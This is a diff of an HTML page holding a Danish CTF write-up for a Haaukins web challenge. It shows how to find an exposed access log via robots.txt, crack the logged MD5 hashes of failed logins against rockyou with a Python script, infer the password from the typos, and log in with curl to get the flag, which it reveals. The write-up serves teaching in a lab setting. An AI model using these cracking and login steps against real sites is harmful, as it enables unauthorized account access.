@@ -28,15 +28,40 @@
 <div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinnene viser metoden, det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
 <div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik. Læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
-<h2>Hvad går opgaven ud på?</h2>
-<pre><code>curl http://handyman-joe.com/robots.txt            # Disallow: /~admin/accesslog.txt
-curl http://handyman-joe.com/~admin/accesslog.txt
-#   Failed login MD5: 880a...  Failed login MD5: 5c3d...  Successful login</code></pre>
-             <p>Her er den kloge indsigt: de to fejlede forsøg lige FØR et vellykket login er
-             <strong>typos</strong> af det rigtige password (folk taster forkert et par gange først). Knæk de
-             to MD5'er med rockyou: <code>proffesional</code> og <code>profesional</code>, og den korrekte
-             stavning midt imellem er passwordet: <code>professional</code>. Log ind, publicér et indlæg,
-             og flaget vises.</p>
+<h2>robots.txt afslører en eksponeret log</h2>
+<p>Opgaven beder dig logge ind og poste på <code>handyman-joe.com</code>. Start med
+             <code>robots.txt</code>: de stier en side beder crawlere IGNORERE er tit præcis de
+             interessante.</p>
+             <pre><code>curl --resolve handyman-joe.com:80:&lt;ip&gt; http://handyman-joe.com/robots.txt
+# Disallow: /create/   /drafts/   /login/   /logout/
+# Disallow: /~admin/accesslog.txt      &lt;-- en eksponeret access-log</code></pre>
+<h2>Loggen logger MD5 af fejlede login-forsøg</h2>
+<p>Access-loggen er læsbar og indeholder MD5-hashes af input fra fejlede logins, med et
+             vellykket login lige efter:</p>
+             <pre><code>curl --resolve handyman-joe.com:80:&lt;ip&gt; http://handyman-joe.com/~admin/accesslog.txt
+# WARNING: Failed login attempt. Input MD5: 880a3acf50d222734feae7e1ddd2c48e
+# WARNING: Failed login attempt. Input MD5: 5c3d63ed342437f2c603e5360181c1b5
+# INFO:    Successful login attempt          &lt;-- lige efter de to fejl</code></pre>
+             <p>Rækkefølgen er pointen: de to fejl ligger umiddelbart FØR det vellykkede login.</p>
+<h2>Knæk hashene: de fejlede forsøg er typos</h2>
+<p>Knæk de to MD5'er mod rockyou, her med ren <code>hashlib</code> (alternativt
+             <code><span class="gloss" tabindex="0" data-tip="GPU-accelereret password-cracker: knækker hashes mod en wordlist.">hashcat</span> -m 0</code> eller <code><span class="gloss" tabindex="0" data-tip="John the Ripper: password-cracker (CPU-baseret, mange hash-formater).">john</span> --format=raw-md5</code>):</p>
+             <pre><code>import hashlib
+targets = {'880a3acf50d222734feae7e1ddd2c48e', '5c3d63ed342437f2c603e5360181c1b5'}
+for w in open('/usr/share/wordlists/rockyou.txt', 'rb'):
+    if hashlib.md5(w.rstrip(b'\n')).hexdigest() in targets:
+        print(w.decode(errors='replace').strip())
+# proffesional   (typo: dobbelt-f)
+# profesional    (typo: ét s)</code></pre>
+             <p>De to fejl lige før et vellykket login er <strong>typos</strong> af det rigtige password.
+             Den korrekte stavning mellem <code>proffesional</code> og <code>profesional</code> er
+             <code>professional</code>. Login er kun-password, uden brugernavn.</p>
+<h2>Log ind og publicér et indlæg</h2>
+<pre><code>curl --resolve handyman-joe.com:80:&lt;ip&gt; -c c.txt \
+  --data "password=professional" http://handyman-joe.com/login/
+curl --resolve handyman-joe.com:80:&lt;ip&gt; -b c.txt \
+  --data "title=x&amp;content=y&amp;published=y" http://handyman-joe.com/create/
+# Indlægget viser: "...here's your complementary flag: HKN{r5-O1I-nzF1d}"</code></pre>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flag: <span class="flag">HKN{r5-O1I-nzF1d}</span></p>
 </details>
